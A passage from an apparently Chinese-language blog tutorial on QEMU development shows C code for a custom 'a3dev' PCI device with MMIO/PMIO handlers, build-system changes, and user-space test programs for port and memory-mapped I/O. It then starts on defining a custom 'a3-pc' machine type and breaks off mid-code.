class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后是设备实例的初始化函数，在 <code>PCIDeviceClass</code> 当中定义了一个名为 <code>realize</code> 的函数指针，当 PCI 设备被载入时便会调用这个函数指针指向的函数来初始化，所以这里我们也定义一个自己的初始化函数，不过我们需要做的工作其实基本上就只有初始化两个 <code>MemoryRegion</code>，<code>memory_region_init_io()</code> 会为这两个 <code>MemoryRegion</code> 进行初始化的工作，并设置函数表为我们指定的函数表，<code>pci_register_bar()</code> 则用来注册 BAR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是 Class 与 Object（也就是 instance）的初始化函数，这里需要注意的是在 Class 的初始化函数中我们应当设置父类 <code>PCIDeviceClass</code> 的一系列基本属性（也就是 PCI 设备的基本属性）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后就是为我们的 PCI 设备类型注册 TypeInfo 了，这里别忘了<strong>我们的接口中应当增加上 PCI 的接口</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><p>最后我们在 meson 构建系统中加入我们新增的这个设备，在 <code>hw/misc/meson.build</code> 中加入如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">softmmu_ss.add(when: &#x27;CONFIG_PCI_A3DEV&#x27;, if_true: files(&#x27;a3dev.c&#x27;))<br></code></pre></td></tr></table></figure><p>并在 <code>hw/misc/Kconfig</code> 中添加如下内容，这表示我们的设备会在 <code>CONFIG_PCI_DEVICES=y</code> 时编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config PCI_A3DEV<br>    bool<br>    default y if PCI_DEVICES<br>    depends on PCI<br></code></pre></td></tr></table></figure><p>之后编译 Qemu 并附加上 <code>-device a3dev-pci</code> ，之后随便起一个 Linux 系统，此时使用 <code>lspci</code> 指令我们便能看到我们新添加的 pci 设备：</p><p><img src="https://s2.loli.net/2022/07/28/Eu82rKgSlJBtbic.png" alt="image.png"></p><p>我们使用如下程序来测试我们的设备的输入输出，需要注意的是这需要 root 权限：</p><blockquote><p>PMIO，使用 iopl 更改端口权限后便能通过 in&#x2F;out 类指令读写端口</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port_addr;<br><br>        <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no port provided!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] no privilege!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        port_addr = atoi(argv[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] a3dev port addr start at: %d\n&quot;</span>, port_addr);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now writing into a3dev-pci...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                outl(i, port_addr + i * <span class="hljs-number">4</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] writing done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] now reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%d--]&quot;</span>, port_addr + i * <span class="hljs-number">4</span>);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, inl(port_addr + i * <span class="hljs-number">4</span>));<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] reading done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>PMIO 测试成功，设备读写功能正常：</p><p><img src="https://s2.loli.net/2022/07/28/k4G1cOvNHwUtsjQ.png" alt="image.png"></p><blockquote><p>MMIO，使用 mmap 映射 <code>sys</code> 目录下设备的 <code>resource0</code> 文件即可直接读写</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> val)</span><br>&#123;<br>        *addr = val;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *addr)</span><br>&#123;<br>        <span class="hljs-keyword">return</span> *addr;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>        <span class="hljs-type">uint32_t</span> *mmio_addr;<br>        <span class="hljs-type">int</span> dev_fd;<br><br>        dev_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,<br>                        O_RDWR | O_SYNC);<br>        <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to open mmio file! wrong path or no root!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        mmio_addr = (<span class="hljs-type">uint32_t</span>*)<br>                mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (mmio_addr == MAP_FAILED) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to mmap!&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start writing to a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                mmio_write(mmio_addr + i, i);<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write done!&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start reading from a3dev-pci...&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span> / <span class="hljs-number">4</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (i % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[--%p--]&quot;</span>, mmio_addr);<br>                &#125;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %u &quot;</span>, mmio_read(mmio_addr + i));<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[+] read done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>MMIO 测试成功，设备读写功能正常：</p><p><img src="https://s2.loli.net/2022/07/28/RCoHF7SWPIyD54j.png" alt="image.png"></p><h1 id="0x05-自定义-QEMU-机器类型（🕊）"><a href="#0x05-自定义-QEMU-机器类型（🕊）" class="headerlink" title="0x05.自定义 QEMU 机器类型（🕊）"></a>0x05.自定义 QEMU 机器类型（🕊）</h1><p>众所周知在 Qemu 当中有很多种不同的机器类型，其表示着包含一些默认设备（包含PCIe显卡、以太网控制器、SATA控制器等）的虚拟芯片组，例如 <code>pc</code> 对应于 Intel 的 <code>440FX</code> 芯片组（这也是 Qemu 默认选择的机器类型）</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>Qemu 主要支持两种大的 x86 芯片组：i440FX 和 Q35，后者相比前者而言的一个大的亮点便是增加了对 PCIe 的支持：</p><p><img src="https://s2.loli.net/2022/07/14/2xgwV7GeSskzWc4.png" alt="image.png"></p><p>我们可以使用 <code>-machine</code> 选项来指定我们要创建的虚拟机的机器类型，通过 <code>-machine ?</code> 选项可以查看当前支持的机器类型：</p><p><img src="https://s2.loli.net/2022/07/14/v6G5DV4SK7hCbRZ.png" alt="image.png"></p><p>但自带的机器类型通常往往无法满足我们多样化的要求，因此有的时候我们需要自行编写一种机器类型来满足我们的需求</p><h2 id="一、添加源码文件与编译选项"><a href="#一、添加源码文件与编译选项" class="headerlink" title="一、添加源码文件与编译选项"></a>一、添加源码文件与编译选项</h2><p>在 Qemu 源码目录中，与具体支持的硬件相关的代码都放在 <code>hw/</code> 目录下，例如默认的 <code>PC</code> 架构便定义于 <code>hw/i386/pc.c</code>，因此若是我们想要定义一种新的机器类型则在该目录下进行定义是最好的</p><p>老版本的 Qemu 是纯粹基于 Makefile 进行构建的，而现在的新版本 Qemu 中则是使用 meson 进行项目构建，因此笔者接下来将会同时介绍两种配置方法</p><h3 id="I、新版本-Qemu-配置方式（meson）"><a href="#I、新版本-Qemu-配置方式（meson）" class="headerlink" title="I、新版本 Qemu 配置方式（meson）"></a>I、新版本 Qemu 配置方式（meson）</h3><p>这里我们选择定义一种新的机器类型名为 <code>a3-pc</code>，并在 <code>hw/i386/a3-pc</code> 下创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree hw/i386/a3-pc/</span><br>hw/i386/a3-pc/<br>├── accel.c<br>├── machine.c<br>└── meson.build<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>三个文件说明如下：</p><ul><li><code>meson.build</code>：meson 项目构建文件</li><li><code>machine.c</code>：机器的主体代码</li><li><code>accel.c</code>：自定义的 accelerator 代码</li></ul><p>在 <code>meson.build</code> 中写入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3pc_ss = ss.source_set()<br>a3pc_ss.add(files(&#x27;accel.c&#x27;))<br>a3pc_ss.add(files(&#x27;machine.c&#x27;))<br><br>i386_ss.add_all(when: &#x27;CONFIG_A3_PC&#x27;, if_true: a3pc_ss)<br></code></pre></td></tr></table></figure><p>之后在 <code>hw/i386/meson.build</code> 中添加该语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">subdir(&#x27;a3-pc&#x27;)<br></code></pre></td></tr></table></figure><p>这里笔者选择创建一个 i386 类型的机器，因此我们还需要修改 <code>hw/i386/Kconfig</code>，添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>在 <code>configs/devices/i386-softmmu/default.mak</code> 末尾添加如下内容，使得我们的新的机器类型会被默认编译进去：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_A3_PC=y<br></code></pre></td></tr></table></figure><h3 id="II、老版本-Qemu-配置方式（makefile）"><a href="#II、老版本-Qemu-配置方式（makefile）" class="headerlink" title="II、老版本 Qemu 配置方式（makefile）"></a>II、老版本 Qemu 配置方式（makefile）</h3><p>如果是版本稍微老一点的 Qemu 则应当在 <code>hw/a3-pc</code> 下创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree ./hw/a3-pc/</span><br>./hw/a3-pc/<br>├── accel.c<br>├── machine.c<br>└── Makefile.objs<br><br>0 directories, 3 files<br></code></pre></td></tr></table></figure><p>三个文件说明如下：</p><ul><li><code>Makefile.objs</code>：机器的 Makefile 文件</li><li><code>machine.c</code>：机器的主体代码</li><li><code>accel.c</code>：自定义的 accelerator 代码，也可以直接用默认的 TCG accelerator</li></ul><p>并在 <code>Makefile.objs</code> 中添加如下内容：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += accel.o<br>obj-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += machine.o<br></code></pre></td></tr></table></figure><p>之后在 <code>hw/Makefile.objs</code> 中添加上该配置：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">devices-dirs-y = core/<br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(CONFIG_SOFTMMU)</span>, y)<br><span class="hljs-comment"># ...</span><br>devices-dirs-<span class="hljs-variable">$(CONFIG_A3_PC)</span> += a3-pc/<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p>这里我们通过添加一个新的选项 <code>CONFIG_A3_PC</code> 来控制是否要进行该类型机器的编译</p><p>笔者选择创建一个 i386 类型的机器，因此我们还需要修改 <code>hw/i386/Kconfig</code>，添加如下内容，表示一个空白的机器，后面我们若是需要添加硬件则还需要在这部分进行改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config A3_PC<br>    bool<br></code></pre></td></tr></table></figure><p>最后我们在源码根目录的 <code>configure</code> 文件中添加如下内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">supported_a3_pc_target</span></span>() &#123;<br>    <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a3_pc</span>&quot;</span> = <span class="hljs-string">&quot;yes&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    glob <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-string">&quot;*-softmmu&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1%-softmmu&#125;</span>&quot;</span> <span class="hljs-keyword">in</span><br>x86_64)<br>    <span class="hljs-built_in">return</span> 0<br>    ;;<br>    <span class="hljs-keyword">esac</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">supported_target</span></span>() &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span><br><span class="hljs-comment"># ...</span><br>    supported_a3_pc_target <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    print_error <span class="hljs-string">&quot;TCG disabled, but hardware accelerator not available for &#x27;<span class="hljs-variable">$target</span>&#x27;&quot;</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">for</span> opt <span class="hljs-keyword">do</span><br>  optarg=$(<span class="hljs-built_in">expr</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$opt</span>&quot;</span> : <span class="hljs-string">&#x27;x[^=]*=\(.*\)&#x27;</span>)<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$opt</span>&quot;</span> <span class="hljs-keyword">in</span><br>  --<span class="hljs-built_in">help</span>|-h) show_help=<span class="hljs-built_in">yes</span><br>  ;;<br>  <span class="hljs-comment">#...</span><br>  ;;<br>  --enable-a3-pc) a3_pc=<span class="hljs-string">&quot;yes&quot;</span><br>  ;;<br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># 这一块可以放在 supported_whpx_target 的那个语句块下面</span><br><span class="hljs-keyword">if</span> supported_a3_pc_target <span class="hljs-variable">$target</span>; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_target_mak</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_host_mak</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>如果我们想要改变编译出来的可执行文件的名字，还可以在 <code>Makefile.target</code> 中修改如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> CONFIG_USER_ONLY<br><span class="hljs-comment"># user emulator name</span><br>QEMU_PROG=qemu-<span class="hljs-variable">$(TARGET_NAME)</span><br>QEMU_PROG_BUILD = <span class="hljs-variable">$(QEMU_PROG)</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">ifdef</span> CONFIG_A3_PC<br><span class="hljs-comment"># arttnba3 type machine</span><br>QEMU_PROG=a3-pc<br><span class="hljs-keyword">else</span><br><span class="hljs-comment"># system emulator name</span><br>QEMU_PROG=qemu-system-<span class="hljs-variable">$(TARGET_NAME)</span><span class="hljs-variable">$(EXESUF)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h2 id="二、定义新的-Machine-Type"><a href="#二、定义新的-Machine-Type" class="headerlink" title="二、定义新的 Machine Type"></a>二、定义新的 Machine Type</h2><h3 id="I、machine-c：machine-基本定义"><a href="#I、machine-c：machine-基本定义" class="headerlink" title="I、machine.c：machine 基本定义"></a>I、machine.c：machine 基本定义</h3><p>虽然 Qemu 是使用 C 语言编写的，但是在 Qemu 当中同样使用了 OOP 的思想，通过结构体嵌套的形式实现继承</p><p>在 Qemu 当中使用 <code>MachineState</code> 结构体类型表示一个通用虚拟机的状态，使用 <code>MachineClass</code> 结构体类型表示一个通用的虚拟机类型，因此对于我们需要创建的新的机器类型，我们需要分别定义他的状态类与类型类，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 